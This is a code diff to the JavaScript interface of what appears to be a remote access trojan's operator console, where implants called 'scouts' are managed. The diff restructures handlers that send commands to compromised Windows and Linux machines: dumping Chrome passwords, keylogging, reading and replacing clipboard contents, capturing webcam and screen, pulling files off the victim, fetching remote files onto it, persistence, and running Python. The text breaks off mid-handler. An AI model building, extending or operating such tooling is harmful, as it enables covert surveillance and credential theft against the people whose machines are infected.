@@ -14,8 +14,11 @@ ScoutGlobals = {
     "scoutOS": undefined
 };
 $(document).ready(function () {
-    // SCOUTS INTERFACE !!
     function onStart () {
+        $('body').append('<div style="" id="div_loading"><div class="loader">Loading...</div></div>');
+        // hide everything
+        // stop all loaders
+        // set interface to scouts
         $("#div_scouts_table_heading").hide();
         $("#div_scouts_table").hide();
         $("#div_direct_lin").hide();
@@ -23,31 +26,39 @@ $(document).ready(function () {
         $("#div_console").hide();
         loader("-1");
         ScoutGlobals.ifc = "Scouts";
+        removeLoader();
     }
     onStart();
 
+    // SCOUTS INTERFACE !!
+
+    // To change the name of the scout base on focusing and unfocusing from the name input
     $(document).on('focusout', '.td_scouts_table_name', function () {
         if ($(this).text() !== "" && !ScoutGlobals.scoutButtonInFocus) {
             if (!ScoutGlobals.nameSentToServer) {
                 ScoutGlobals.nameSentToServer = true;
-                triggerAjax("rename " + $(this).attr('id').split('_')[4] + " " + $(this).text(), true, '/scouts_process', pauseCB, {});
+                triggerAjax("rename " + $(this).attr('id').split('_')[4] + " " + $(this).text(), true, '/scouts_process', renameCB, {});
             }
         }
     });
-    function pauseCB(data) {
-        if (data.output === "Fail") {
+    function renameCB(data) {
+        if (data["output"] === "Fail") {
             ScoutGlobals.error = true;
-            showMessage(data.output_message);
+            showMessage(data["output_message"]);
             scrollToTop();
         }
     }
 
+    // for pinging, disconnecting, sleeping & killing any scout from the scout table
     $(".button_scouts_table").click(function() {
         ScoutGlobals.scoutButtonInFocus = true;
         ScoutGlobals.canSend = true;
         tableRowClickable(true);
         loader($(this).attr('id').split('_')[4]);
         ScoutGlobals.$this = $(this);
+        $("#div_scouts_table_sleep").hide();
+        $("#input_scouts_table_scout_sleep_time").val("");
+        $(".i_scouts_table_spinner").hide();
         $("body").off("click", "#table_scouts tr");
         $("body").on("click", "#table_scouts tr", function(){
             if (ScoutGlobals.canSend && ScoutGlobals.$this.attr('id') !== "button_scouts_table_bridge_0") {
@@ -73,7 +84,7 @@ $(document).ready(function () {
                         }
                         $("#input_scouts_table_scout_sleep_time").val("");
                         $("#div_scouts_table_sleep").hide();
-                        triggerAjax(command +  " " + rowId + " " + time, true, '/scouts_process', sleepScoutFunctionCB, {"rowId": rowId});
+                        triggerAjax(command +  " " + rowId + " " + time, true, '/scouts_process', standardScoutFunctionCB, {"rowId": rowId});
                     });
                     $(".button_scouts_table").prop('disabled', false);
                     return;
@@ -82,27 +93,19 @@ $(document).ready(function () {
             }
         });
     });
-    function sleepScoutFunctionCB(data, extra_input) {
-        ScoutGlobals.idOfSelectedButton = "-1";
-        ScoutGlobals.scoutButtonInFocus = false;
-        tableRowClickable(false);
-        loader("-1");
-        $("#i_scouts_table_spinner_" + extra_input.rowId).hide();
-        $("body").off("click", "#table_scouts tr")
-    }
     function standardScoutFunctionCB(data, extra_input) {
         ScoutGlobals.scoutButtonInFocus = false;
         tableRowClickable(false);
         loader("-1");
         $("#i_scouts_table_spinner_" + extra_input.rowId).hide();
         if (extra_input.command === "ping") {
-            if (data.output === "Success") {
+            if (data["output"] === "Success") {
                 ScoutGlobals.error = false;
-                showMessage(data.output_message);
+                showMessage(data["output_message"]);
                 scrollToTop();
             } else {
                 ScoutGlobals.error = true;
-                showMessage(data.output_message);
+                showMessage(data["output_message"]);
                 scrollToTop();
             }
         }
@@ -111,7 +114,10 @@ $(document).ready(function () {
         $("body").off("click", "#table_scouts tr")
     }
 
+
     // BRIDGING STUFF !!
+
+    // handler for bridge button click
     $('#button_scouts_table_bridge_0').click(function() {
         ScoutGlobals.idOfSelectedButton = "0";
         ScoutGlobals.scoutButtonInFocus = true;
@@ -127,17 +133,18 @@ $(document).ready(function () {
             }
         });
     });
+    // handler for successful and failed bridging
     function bridgeScoutFunctionCB(data){
-        if (data.output === "Success") {
+        if (data["output"] === "Success") {
             ScoutGlobals.scoutButtonInFocus = false;
             ScoutGlobals.idOfSelectedButton = "-1";
-            ScoutGlobals.bridgedId = data.data[0];
+            ScoutGlobals.bridgedId = data["data"][0];
             ScoutGlobals.ifc = "Direct";
 
             $(".i_scouts_table_spinner").hide();
             tableRowClickable(false);
 
-            $("#h1_scouts_heading").text("Scout >> " + data.data[1]);
+            $("#h1_scouts_heading").text("Scout >> " + data["data"][1]);
             $("#div_scouts").hide();
             $("#div_console").show();
 
@@ -152,14 +159,15 @@ $(document).ready(function () {
             triggerAjaxDirectInterface("help", true, loadScoutFunctionsCB, undefined)
         } else {
             ScoutGlobals.error = true;
-            showMessage(data.output_message);
+            showMessage(data["output_message"]);
             scrollToTop();
         }
     }
+    // handler to load all available functionality on scout
     function loadScoutFunctionsCB(data) {
-        if (data.output === "Success") {
+        if (data["output"] === "Success") {
             $("body").off("click", "#table_scouts tr");
-            highlightAvailableFunctions(data.data);
+            highlightAvailableFunctions(data["data"]);
             if (ScoutGlobals.scoutOS === "win") {
                 $("#div_direct_win").show();
             } else if (ScoutGlobals.scoutOS === "lin") {
@@ -179,39 +187,45 @@ $(document).ready(function () {
             $("#button_direct_components_lin_back").hide();
 
             logToConsole("[+]Available functions loaded", true);
-            displaySelectedFunctions("base")
+            displaySelectedFunctions("base");
             logToConsole("", false, true);
         } else {
             ScoutGlobals.error = true;
-            showMessage(data.output_message);
+            showMessage(data["output_message"]);
             scrollToTop();
-            switchToScoutIFC();
+            ScoutGlobals.ifc = "Scouts";
         }
     }
 
 
+    // DIRECT INTERFACE !!
+
+    // for pinging, disconnecting, killing & sleeping after bridging to scout i.e. handlers for the buttons in the base tab
     $(".button_direct_classify_win_base").click(function () {
+        ScoutGlobals.sleepTimeSentToServer = false;
         let command = $(this).attr('id').split('_')[5];
         let id = $(this).attr('id').split('_')[6];
+        $("#div_direct_sleep_win").hide();
+        $("#input_direct_scout_sleep_win_time").val("");
         loaderDirect(id);
         if (command === "sleep") {
             if (!ScoutGlobals.sleepTimeSentToServer) {
                 ScoutGlobals.sleepTimeSentToServer = true;
-                $("#div_direct_sleep").show();
-                $("#button_direct_scout_sleep_time").unbind("click").click(function () {
+                $("#div_direct_sleep_win").show();
+                $("#button_direct_scout_sleep_win_time").unbind("click").click(function () {
                     let time;
-                    if ($("#input_direct_scout_sleep_time").val() !== "") {
-                        if (parseInt($("#input_direct_scout_sleep_time").val(), 10) > 0) {
-                            time = String($("#input_direct_scout_sleep_time").val());
+                    if ($("#input_direct_scout_sleep_win_time").val() !== "") {
+                        if (parseInt($("#input_direct_scout_sleep_win_time").val(), 10) > 0) {
+                            time = String($("#input_direct_scout_sleep_win_time").val());
                         } else {
                             time = "10";
                         }
                     } else {
                         time = "10";
                     }
-                    $("#input_direct_scout_sleep_time").val("");
-                    $("#div_direct_sleep").hide();
-                    triggerAjaxDirectInterface(command + " " + time, true, sleepDirectButtonCB, {});
+                    $("#input_direct_scout_sleep_win_time").val("");
+                    $("#div_direct_sleep_win").hide();
+                    triggerAjaxDirectInterface(command + " " + time, true, standardDirectButtonCB, {});
                 });
                 $(".button_direct_classify_win_base").prop('disabled', false);
             }
@@ -220,27 +234,30 @@ $(document).ready(function () {
         triggerAjaxDirectInterface(command, true, standardDirectButtonCB, {"command": command});
     });
     $(".button_direct_classify_lin_base").click(function () {
+        ScoutGlobals.sleepTimeSentToServer = false;
         let command = $(this).attr('id').split('_')[4];
         let id = $(this).attr('id').split('_')[5];
+        $("#div_direct_sleep_lin").hide();
+        $("#input_direct_scout_sleep_lin_time").val("");
         loaderDirect(id);
         if (command === "sleep") {
             if (!ScoutGlobals.sleepTimeSentToServer) {
                 ScoutGlobals.sleepTimeSentToServer = true;
-                $("#div_direct_sleep").show();
-                $("#button_direct_scout_sleep_time").unbind("click").click(function () {
+                $("#div_direct_sleep_lin").show();
+                $("#button_direct_scout_sleep_lin_time").unbind("click").click(function () {
                     let time;
-                    if ($("#input_direct_scout_sleep_time").val() !== "") {
-                        if (parseInt($("#input_direct_scout_sleep_time").val(), 10) > 0) {
-                            time = String($("#input_direct_scout_sleep_time").val());
+                    if ($("#input_direct_scout_sleep_lin_time").val() !== "") {
+                        if (parseInt($("#input_direct_scout_sleep_lin_time").val(), 10) > 0) {
+                            time = String($("#input_direct_scout_sleep_lin_time").val());
                         } else {
                             time = "10";
                         }
                     } else {
                         time = "10";
                     }
-                    $("#input_direct_scout_sleep_time").val("");
-                    $("#div_direct_sleep").hide();
-                    triggerAjaxDirectInterface(command + " " + time, true, sleepDirectButtonCB, {});
+                    $("#input_direct_scout_sleep_lin_time").val("");
+                    $("#div_direct_sleep_lin").hide();
+                    triggerAjaxDirectInterface(command + " " + time, true, standardDirectButtonCB, {});
                 });
                 $(".button_direct_classify_lin_base").prop('disabled', false);
             }
@@ -249,8 +266,8 @@ $(document).ready(function () {
         triggerAjaxDirectInterface(command, true, standardDirectButtonCB, {"command": command});
     });
     function standardDirectButtonCB(data, extra_input) {
-        if (data.output === "Success") {
-            if (data.output_message === "return") {
+        if (data["output"] === "Success") {
+            if (data["output_message"] === "Returning to scouts") {
                 if (extra_input.command === "ping"){
                     ScoutGlobals.error = true;
                     showMessage("Scout is dead, removing from database...");
@@ -261,21 +278,15 @@ $(document).ready(function () {
             } else {
                 if (extra_input.command === "ping"){
                     ScoutGlobals.error = false;
-                    showMessage(data.output_message);
+                    showMessage(data["output_message"]);
                     scrollToTop();
                 }
                 loaderDirect("-1");
             }
         }
     }
-    function sleepDirectButtonCB(data) {
-        if (data.output_message === "return") {
-            ScoutGlobals.sleepTimeSentToServer = false;
-            ScoutGlobals.ifc = "Scouts";
-            loaderDirect("-1");
-        }
-    }
 
+    // for switching between tabs
     $("#button_direct_classify_win_main_base").click(function () {
        displaySelectedFunctions("base");
     });
@@ -291,7 +302,6 @@ $(document).ready(function () {
     $("#button_direct_classify_win_main_persist").click(function () {
        displaySelectedFunctions("persist");
     });
-
     $("#button_direct_classify_lin_main_base").click(function () {
        displaySelectedFunctions("base");
     });
@@ -308,6 +318,7 @@ $(document).ready(function () {
        displaySelectedFunctions("persist");
     });
 
+    // handler for the '<< back <<' button which takes you back to the home page of the scout
     $("#button_direct_components_win_back").click(function () {
        displayComponents("");
        $("#button_direct_components_win_back").hide();
@@ -319,10 +330,11 @@ $(document).ready(function () {
        $("#div_direct_classify_lin").show();
     });
 
+    // handler which logs output from all of the commands to the console
     function logOutputCB(data, extra_input=undefined) {
-        if (data.output === "Success") {
+        if (data["output"] === "Success") {
             if (extra_input) {
-                if (data.output_message === "return") {
+                if (data["output_message"] === "Returning to scouts") {
                     if (extra_input.command === "ping"){
                         ScoutGlobals.error = true;
                         showMessage("Scout is dead, removing from database...");
@@ -333,137 +345,161 @@ $(document).ready(function () {
                 } else {
                     if (extra_input.command === "ping"){
                         ScoutGlobals.error = false;
-                        showMessage(data.output_message);
+                        showMessage(data["output_message"]);
                         scrollToTop();
                     }
                     loaderDirect("-1");
                 }
             }
             else {
-                logToConsole(data.data, true);
+                logToConsole(data["data"], true);
             }
             logToConsole("", false, true);
-        } else if (data.output === "Fail") {
+        } else if (data["output"] === "Fail") {
             ScoutGlobals.error = true;
-            showMessage(data.output_message);
+            showMessage(data["output_message"]);
             scrollToTop();
-            switchToScoutIFC();
+            ScoutGlobals.ifc = "Scouts";
         }
     }
 
+    // Handler for manual console input
+    $(document).on('focus', ".input_console_command", function() {
+        $(document).off('keypress, keydown', '.input_console_command');
+        $(document).on('keypress, keydown', '.input_console_command', function(event) {
+            if (event.which === 13) {
+                event.preventDefault();
+                $(this).attr("readonly", true);
+                let val = $(this).val();
+                if (val === "ping" || val === "disconnect" || val === "kill" || val.split(" ")[0] === "sleep"){
+                    triggerAjaxDirectInterface(val, true, logOutputCB, {"command": val});
+                } else if (val === "help" || val === "?") {
+                    triggerAjaxDirectInterface("help_command", true, logOutputCB);
+                } else if (val === "exec_py_script") {
+                    $("#p_console_output").append("<div id='div_console_scripter_"+String(ScoutGlobals.terminalCount)+"'></div>");
+                    $("#div_console_scripter_"+String(ScoutGlobals.terminalCount)).html("You are currently in the python executor scripter, script a chain of python instructions to run, press execute to run (only works if python execute component is loaded)<input type='text' id='input_console_scripter_"+String(ScoutGlobals.terminalCount)+"_0' class='multiline command_input triggerOnExit' name='Python' value='>>> ' style='width: 100% !important; height: 25px !important; background-color: #252629 !important; border-radius: 0 !important; margin: 0 !important;' autocomplete='off'>");
+                    ScoutGlobals.terminalCount = ScoutGlobals.terminalCount + 1;
+                } else {
+                    triggerAjaxDirectInterface(val, true, logOutputCB, undefined);
+                }
+            }
+        });
+    });
 
 
+    // SCOUT FUNCTIONALITY !!
+
+    // READ
+
+    // Windows - Read - Active Windows Dump
     $("#button_direct_classify_win_read_activeWindowsDump").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("activeWindowsDump");
+        displayComponents("activeWindowsDump", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_activeWindowsDump").click(function () {
+    $("#button_direct_components_win_read_activeWindowsDump").click(function () {
         $(".input_console_command").last().val("active");
         $(".input_console_command").last().attr("readonly", true);
         triggerAjaxDirectInterface("active", true, logOutputCB, undefined);
     });
-
+    // Linux - Read - Active Windows Dump
     $("#button_direct_classify_lin_read_activeWindowsDump").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("activeWindowsDump");
+        displayComponents("activeWindowsDump", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_activeWindowsDump").click(function () {
+    $("#button_direct_components_lin_read_activeWindowsDump").click(function () {
         $(".input_console_command").last().val("active");
         triggerAjaxDirectInterface("active", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Read - Check Admin
     $("#button_direct_classify_win_read_checkAdmin").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("checkAdmin");
+        displayComponents("checkAdmin", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_checkAdmin").click(function () {
+    $("#button_direct_components_win_read_checkAdmin").click(function () {
         $(".input_console_command").last().val("admin");
         triggerAjaxDirectInterface("admin", true, logOutputCB, undefined);
     });
-
+    // Linux - Read - Check Admin
     $("#button_direct_classify_lin_read_checkAdmin").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("checkAdmin");
+        displayComponents("checkAdmin", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_checkAdmin").click(function () {
+    $("#button_direct_components_lin_read_checkAdmin").click(function () {
         $(".input_console_command").last().val("admin");
         triggerAjaxDirectInterface("admin", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Read - Chrome Password Dump
     $("#button_direct_classify_win_read_chromePasswordDump").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("chromePasswordDump");
+        displayComponents("chromePasswordDump", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_chromePasswordDump_active").click(function () {
+    $("#button_direct_components_win_read_chromePasswordDump_active").click(function () {
         $(".input_console_command").last().val("chromedump active");
         triggerAjaxDirectInterface("chromedump active", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_chromePasswordDump_passive").click(function () {
+    $("#button_direct_components_win_read_chromePasswordDump_passive").click(function () {
         $(".input_console_command").last().val("chromedump passive");
         triggerAjaxDirectInterface("chromedump passive", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Read - Clip Logger
     $("#button_direct_classify_win_read_clipLogger").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("clipLogger");
+        displayComponents("clipLogger", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_clipLogger_clear").click(function () {
+    $("#button_direct_components_win_read_clipLogger_clear").click(function () {
         $(".input_console_command").last().val("clip_clear");
         triggerAjaxDirectInterface("clip_clear", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_clipLogger_dump").click(function () {
+    $("#button_direct_components_win_read_clipLogger_dump").click(function () {
         $(".input_console_command").last().val("clip_dump");
         triggerAjaxDirectInterface("clip_dump", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_clipLogger_set").click(function () {
-        if ($("#input_direct_components_win_clipLogger_set").val() !== "") {
-            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_win_clipLogger_set").val(), true);
-            triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_win_clipLogger_set").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_clipLogger_set").val("");
+    $("#button_direct_components_win_read_clipLogger_set").click(function () {
+        if ($("#input_direct_components_win_read_clipLogger_set").val() !== "") {
+            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_win_read_clipLogger_set").val(), true);
+            triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_win_read_clipLogger_set").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_read_clipLogger_set").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid string");
             scrollToTop();
         }
     });
-
+    // Linux - Read - Clip Logger
     $("#button_direct_classify_lin_read_clipLogger").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("clipLogger");
+        displayComponents("clipLogger", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_clipLogger_clear").click(function () {
+    $("#button_direct_components_lin_read_clipLogger_clear").click(function () {
         $(".input_console_command").last().val("clip_clear");
         triggerAjaxDirectInterface("clip_clear", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_lin_clipLogger_dump").click(function () {
+    $("#button_direct_components_lin_read_clipLogger_dump").click(function () {
         $(".input_console_command").last().val("clip_dump");
         triggerAjaxDirectInterface("clip_dump", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_lin_clipLogger_set").click(function () {
-        if ($("#input_direct_components_lin_clipLogger_set").val() !== "") {
-            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_lin_clipLogger_set").val(), true);
-            triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_lin_clipLogger_set").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_clipLogger_set").val("");
+    $("#button_direct_components_lin_read_clipLogger_set").click(function () {
+        if ($("#input_direct_components_lin_read_clipLogger_set").val() !== "") {
+            $(".input_console_command").last().val("clip_set " + $("#input_direct_components_lin_read_clipLogger_set").val(), true);
+            triggerAjaxDirectInterface("clip_set " + $("#input_direct_components_lin_read_clipLogger_set").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_read_clipLogger_set").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid string");
@@ -471,37 +507,36 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Read - Download File
     $("#button_direct_classify_win_read_downloadFile").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("downloadFile");
+        displayComponents("downloadFile", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_downloadFile").click(function () {
-        if ($("#input_direct_components_win_downloadFile").val() !== "") {
-            $(".input_console_command").last().val("download " + $("#input_direct_components_win_downloadFile").val(), true);
-            triggerAjaxDirectInterface("download " + $("#input_direct_components_win_downloadFile").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_downloadFile").val("");
+    $("#button_direct_components_win_read_downloadFile").click(function () {
+        if ($("#input_direct_components_win_read_downloadFile").val() !== "") {
+            $(".input_console_command").last().val("download " + $("#input_direct_components_win_read_downloadFile").val(), true);
+            triggerAjaxDirectInterface("download " + $("#input_direct_components_win_read_downloadFile").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_read_downloadFile").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
             scrollToTop();
         }
     });
-
+    // Linux - Read - Download File
     $("#button_direct_classify_lin_read_downloadFile").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("downloadFile");
+        displayComponents("downloadFile", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_downloadFile").click(function () {
-        if ($("#input_direct_components_lin_downloadFile").val() !== "") {
-            $(".input_console_command").last().val("download " + $("#input_direct_components_lin_downloadFile").val(), true);
-            triggerAjaxDirectInterface("download " + $("#input_direct_components_lin_downloadFile").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_downloadFile").val("");
+    $("#button_direct_components_lin_read_downloadFile").click(function () {
+        if ($("#input_direct_components_lin_read_downloadFile").val() !== "") {
+            $(".input_console_command").last().val("download " + $("#input_direct_components_lin_read_downloadFile").val(), true);
+            triggerAjaxDirectInterface("download " + $("#input_direct_components_lin_read_downloadFile").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_read_downloadFile").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory");
@@ -509,39 +544,38 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Read - Download Web
     $("#button_direct_classify_win_read_downloadWeb").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("downloadWeb");
+        displayComponents("downloadWeb", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_downloadWeb").click(function () {
-        if ($("#input_direct_components_win_downloadWeb_directory").val() !== "" && $("#input_direct_components_win_downloadWeb_url").val() !== "") {
-            $(".input_console_command").last().val("download_web " + $("#input_direct_components_win_downloadWeb_url").val() + " " + $("#input_direct_components_win_downloadWeb_directory").val(), true);
-            triggerAjaxDirectInterface("download_web " + $("#input_direct_components_win_downloadWeb_url").val() + " " + $("#input_direct_components_win_downloadWeb_directory").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_win_downloadWeb_directory").val("");
-            $("#input_direct_components_win_downloadWeb_url").val("");
+    $("#button_direct_components_win_read_downloadWeb").click(function () {
+        if ($("#input_direct_components_win_read_downloadWeb_directory").val() !== "" && $("#input_direct_components_win_read_downloadWeb_url").val() !== "") {
+            $(".input_console_command").last().val("download_web " + $("#input_direct_components_win_read_downloadWeb_url").val() + " " + $("#input_direct_components_win_read_downloadWeb_directory").val(), true);
+            triggerAjaxDirectInterface("download_web " + $("#input_direct_components_win_read_downloadWeb_url").val() + " " + $("#input_direct_components_win_read_downloadWeb_directory").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_win_read_downloadWeb_directory").val("");
+            $("#input_direct_components_win_read_downloadWeb_url").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory / url");
             scrollToTop();
         }
     });
-
+    // Linux - Read - Download Web
     $("#button_direct_classify_lin_read_downloadWeb").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("downloadWeb");
+        displayComponents("downloadWeb", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_downloadWeb").click(function () {
-        if ($("#input_direct_components_lin_downloadWeb_directory").val() !== "" && $("#input_direct_components_lin_downloadWeb_url").val() !== "") {
-            $(".input_console_command").last().val("download_web " + $("#input_direct_components_lin_downloadWeb_url").val() + " " + $("#input_direct_components_lin_downloadWeb_directory").val(), true);
-            triggerAjaxDirectInterface("download_web " + $("#input_direct_components_lin_downloadWeb_url").val() + " " + $("#input_direct_components_lin_downloadWeb_directory").val(), true, logOutputCB, undefined);
-            $("#input_direct_components_lin_downloadWeb_directory").val("");
-            $("#input_direct_components_lin_downloadWeb_url").val("");
+    $("#button_direct_components_lin_read_downloadWeb").click(function () {
+        if ($("#input_direct_components_lin_read_downloadWeb_directory").val() !== "" && $("#input_direct_components_lin_read_downloadWeb_url").val() !== "") {
+            $(".input_console_command").last().val("download_web " + $("#input_direct_components_lin_read_downloadWeb_url").val() + " " + $("#input_direct_components_lin_read_downloadWeb_directory").val(), true);
+            triggerAjaxDirectInterface("download_web " + $("#input_direct_components_lin_read_downloadWeb_url").val() + " " + $("#input_direct_components_lin_read_downloadWeb_directory").val(), true, logOutputCB, undefined);
+            $("#input_direct_components_lin_read_downloadWeb_directory").val("");
+            $("#input_direct_components_lin_read_downloadWeb_url").val("");
         } else {
             ScoutGlobals.error = true;
             showMessage("Please enter a valid directory / url");
@@ -549,144 +583,141 @@ $(document).ready(function () {
         }
     });
 
-
-
+    // Windows - Read - Get Idle
     $("#button_direct_classify_win_read_getIdle").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("getIdle");
+        displayComponents("getIdle", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_getIdle").click(function () {
+    $("#button_direct_components_win_read_getIdle").click(function () {
         $(".input_console_command").last().val("idle");
         triggerAjaxDirectInterface("idle", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Read - Screenshot
     $("#button_direct_classify_win_read_screenshot").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("screenshot");
+        displayComponents("screenshot", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_screenshot").click(function () {
+    $("#button_direct_components_win_read_screenshot").click(function () {
         $(".input_console_command").last().val("screen");
         triggerAjaxDirectInterface("screen", true, logOutputCB, undefined);
     });
-
+    // Linux - Read - Screenshot
     $("#button_direct_classify_lin_read_screenshot").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("screenshot");
+        displayComponents("screenshot", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_screenshot").click(function () {
+    $("#button_direct_components_lin_read_screenshot").click(function () {
         $(".input_console_command").last().val("screen");
         triggerAjaxDirectInterface("screen", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Read - Webcam
     $("#button_direct_classify_win_read_webcam").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("webcam");
+        displayComponents("webcam", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_webcam").click(function () {
+    $("#button_direct_components_win_read_webcam").click(function () {
         $(".input_console_command").last().val("webcam");
         triggerAjaxDirectInterface("webcam", true, logOutputCB, undefined);
     });
-
+    // Linux - Read - Webcam
     $("#button_direct_classify_lin_read_webcam").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("webcam");
+        displayComponents("webcam", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_webcam").click(function () {
+    $("#button_direct_components_lin_read_webcam").click(function () {
         $(".input_console_command").last().val("webcam");
         triggerAjaxDirectInterface("webcam", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Read - Key Logger
     $("#button_direct_classify_win_read_logger").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("logger");
+        displayComponents("logger", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_logger_start").click(function () {
+    $("#button_direct_components_win_read_logger_start").click(function () {
         $(".input_console_command").last().val("key_start");
         triggerAjaxDirectInterface("key_start", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_logger_stop").click(function () {
+    $("#button_direct_components_win_read_logger_stop").click(function () {
         $(".input_console_command").last().val("key_stop");
         triggerAjaxDirectInterface("key_stop", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_win_logger_dump").click(function () {
+    $("#button_direct_components_win_read_logger_dump").click(function () {
         $(".input_console_command").last().val("key_dump");
         triggerAjaxDirectInterface("key_dump", true, logOutputCB, undefined);
     });
-
+    // Linux - Read - Key Logger
     $("#button_direct_classify_lin_read_logger").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("logger");
+        displayComponents("logger", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_logger_start").click(function () {
+    $("#button_direct_components_lin_read_logger_start").click(function () {
         $(".input_console_command").last().val("key_start");
         triggerAjaxDirectInterface("key_start", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_lin_logger_stop").click(function () {
+    $("#button_direct_components_lin_read_logger_stop").click(function () {
         $(".input_console_command").last().val("key_stop");
         triggerAjaxDirectInterface("key_stop", true, logOutputCB, undefined);
     });
-    $("#button_direct_components_lin_logger_dump").click(function () {
+    $("#button_direct_components_lin_read_logger_dump").click(function () {
         $(".input_console_command").last().val("key_dump");
         triggerAjaxDirectInterface("key_dump", true, logOutputCB, undefined);
     });
 
-
-
+    // Windows - Read - System Information
     $("#button_direct_classify_win_read_systemInfo").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("systemInfo");
+        displayComponents("systemInfo", "read");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_systemInfo").click(function () {
+    $("#button_direct_components_win_read_systemInfo").click(function () {
         $(".input_console_command").last().val("sysinfo");
         triggerAjaxDirectInterface("sysinfo", true, logOutputCB, undefined);
     });
-
+    // Linux - Read - System Information
     $("#button_direct_classify_lin_read_systemInfo").click(function () {
         displaySelectedFunctions("read");
-        displayComponents("systemInfo");
+        displayComponents("systemInfo", "read");
         $("#button_direct_components_lin_back").show();
         $("#div_direct_classify_lin").hide();
     });
-    $("#button_direct_components_lin_systemInfo").click(function () {
+    $("#button_direct_components_lin_read_systemInfo").click(function () {
         $(".input_console_command").last().val("sysinfo");
         triggerAjaxDirectInterface("sysinfo", true, logOutputCB, undefined);
     });
 
 
+    // WRITE
 
+    // Windows - Write - Browser
     $("#button_direct_classify_win_write_browser").click(function () {
         displaySelectedFunctions("write");
-        displayComponents("browser");
+        displayComponents("browser", "write");
         $("#button_direct_components_win_back").show();
         $("#div_direct_classify_win").hide();
     });
-    $("#button_direct_components_win_browser").click(function () {
